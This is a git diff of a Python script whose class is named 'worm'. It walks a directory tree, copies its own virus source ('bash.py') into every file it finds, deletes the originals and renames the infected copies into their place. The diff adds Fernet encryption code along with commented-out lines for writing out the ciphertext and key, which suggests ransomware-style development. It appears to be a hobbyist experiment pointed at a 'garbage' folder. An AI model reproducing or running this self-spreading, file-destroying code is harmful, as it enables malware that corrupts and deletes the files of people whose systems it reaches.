@@ -1,4 +1,5 @@
-import os
+from cryptography.fernet import Fernet
+import cryptography
 import random, sys, os
 
 class worm():
@@ -8,16 +9,15 @@ class worm():
         # list of directories
         self.files = []
         self.temp = []
-        #
+
         # list of paths
         self.paths = []
 
         self.virus = open('bash.py', 'r').readlines()
-        for line in self.virus:
-            print(line)
+        print(self.virus)
 
         # the initial path that we are searching along
-        self.path = '~/Users/Drew/Projects/garbage'
+        self.path = '/home/drew/projects/garbage'
 
         for root, directories, files in os.walk(self.path):
             self.temp.append(files)
@@ -52,16 +52,30 @@ class worm():
                     for line in r.readlines():
                         w.write(line)
 
+                with open(newName, 'r') as f:
+                    for line in f.readlines():
+                        print(line)
+                    key = Fernet.generate_key()
+                    cipher_suite = Fernet(key)
+                    cipher_text = cipher_suite.encrypt(b'Test Cypher')
+                    # f.write(cipher_text)
+                    # f.write(key)
+                    # print(key)
+                    # print(cipher_text)
+                    # plain_text = cipher_suite.decrypt(cipher_text)
+
             # remove the old file
             os.remove(file)
 
             # rename the infected file to the old file name
             os.rename(newName, file)
 
+    #
     def reset(self):
         for file in self.files:
             os.remove(file)
 
-# make a worm instance
-worm = worm()
-worm.infect()
+if __name__ == '__main__':
+    # make a worm instance
+    worm = worm()
+    worm.infect()
